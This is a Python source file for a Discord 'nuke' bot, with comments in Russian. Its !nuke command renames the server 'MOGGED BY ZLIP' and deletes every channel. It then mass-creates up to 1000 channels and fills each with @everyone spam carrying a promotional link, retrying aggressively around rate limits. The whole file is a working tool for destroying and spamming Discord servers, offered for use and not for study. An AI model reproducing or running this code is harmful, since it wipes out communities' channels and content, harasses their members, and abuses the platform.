import discord
from discord.ext import commands
import asyncio
import time

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

channel_counter = 0
start_time = 0
rate_limit_hits = 0

@bot.event
async def on_ready():
    print(f'✅ {bot.user} готов к уничтожению')

@bot.command()
async def nuke(ctx):
    global channel_counter, start_time, rate_limit_hits
    channel_counter = 0
    start_time = time.time()
    rate_limit_hits = 0
    
    await ctx.send("**nonerp ebet**")
    
    guild = ctx.guild
    
    try:
        await guild.edit(name="MOGGED BY ZLIP")
        print("✅ Название изменено")
    except:
        print("❌ Не удалось изменить название")
    
    print("🗑️ УДАЛЕНИЕ КАНАЛОВ...")
    
    deleted = 0
    skipped = 0
    channels = list(guild.channels)
    total = len(channels)
    
    async def delete_single_channel(channel):
        try:
            await channel.delete()
            return True
        except:
            return False
    
    batch_size = 100
    for i in range(0, total, batch_size):
        batch = channels[i:i+batch_size]
        tasks = [delete_single_channel(ch) for ch in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                deleted += 1
            else:
                skipped += 1
        
        if (i + batch_size) % 200 == 0:
            print(f"   📦 Удалено {min(i+batch_size, total)}/{total} каналов")
    
    print(f"📊 Каналы: удалено {deleted}, пропущено {skipped}")
    
    print("🔥 МАКСИМАЛЬНО ЖЕСТКОЕ СОЗДАНИЕ КАНАЛОВ...")
    
    SPAM_TEXT = """@everyone
**MOGGED BY ZLIP**

https://guns.lol/dszlip

ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ZLIP
"""
    
    created = 0
    failed = 0
    target_channels = 1000
    
    async def create_single_channel(i):
        global channel_counter, rate_limit_hits
        
        try:
            ch = await guild.create_text_channel(f"zlip-nuked-{i+1}")
            
            messages = [ch.send(SPAM_TEXT) for _ in range(5)]
            await asyncio.gather(*messages)
            
            channel_counter += 1
            
            if channel_counter % 10 == 0:
                elapsed = time.time() - start_time
                speed = channel_counter / elapsed if elapsed > 0 else 0
                print(f"📊 [{channel_counter}] {speed:.1f}/сек")
            
            return True
            
        except discord.Forbidden:
            return False
        except discord.HTTPException as e:
            if "rate" in str(e).lower():
                rate_limit_hits += 1
                wait_time = min(rate_limit_hits * 0.005, 0.02)
                await asyncio.sleep(wait_time)
                return await create_single_channel(i)
            else:
                return False
        except Exception as e:
            return False
    
    batch_size = 50
    max_batches = target_channels // batch_size + 1
    
    for batch_num in range(max_batches):
        tasks = []
        for j in range(batch_size):
            i = batch_num * batch_size + j
            if i >= target_channels:
                break
            tasks.append(create_single_channel(i))
        
        if not tasks:
            break
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if result is True:
                created += 1
            else:
                failed += 1
        
        if created >= target_channels:
            print(f"✅ Достигнута цель: {created} каналов")
            break
        
        if created % 50 == 0 and created > 0:
            elapsed = time.time() - start_time
            speed = created / elapsed if elapsed > 0 else 0
            print(f"📊 ПРОГРЕСС: {created}/{target_channels} ({speed:.1f}/сек)")
    
    print("\n" + "="*50)
    print("💀 НЬЮК ЗАВЕРШЁН 💀")
    print(f"✅ Создано каналов: {created}")
    print(f"✅ Сообщений отправлено: {created * 5}")
    print(f"❌ Ошибок: {failed}")
    print(f"⏱️ Время: {time.time() - start_time:.1f} сек")
    print(f"📊 Скорость: {created / (time.time() - start_time):.1f} каналов/сек")
    print("="*50)
    
    try:
        await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\nСоздано: {created} каналов\nСообщений: {created * 5}")
    except:
        pass

@bot.command()
async def status(ctx):
    await ctx.send("🔥 Бот активен! Используй !nuke")

import os
bot.run(os.environ['TOKEN'])
